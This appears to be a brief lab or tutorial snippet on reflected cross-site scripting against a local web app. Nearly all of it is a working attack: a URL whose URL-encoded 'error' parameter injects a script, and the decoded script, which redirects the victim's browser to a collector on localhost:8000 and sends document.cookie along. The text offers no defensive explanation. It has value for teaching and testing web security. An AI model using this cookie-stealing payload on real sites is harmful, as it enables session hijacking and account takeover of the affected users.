Visit the url:

    http://localhost:8080?error=%3Cscript+type%3D%22text%2Fjavascript%22%3E%0A++++document.location%3D'http%3A%2F%2Flocalhost%3A8000%2F%3Fcookie_data%3D'%2Bdocument.cookie%3B%0A%3C%2Fscript%3E

The error parameter is formed by url encoding the following script:

    <script type="text/javascript">
        document.location='http://localhost:8000/?cookie_data=' + document.cookie;
    </script>

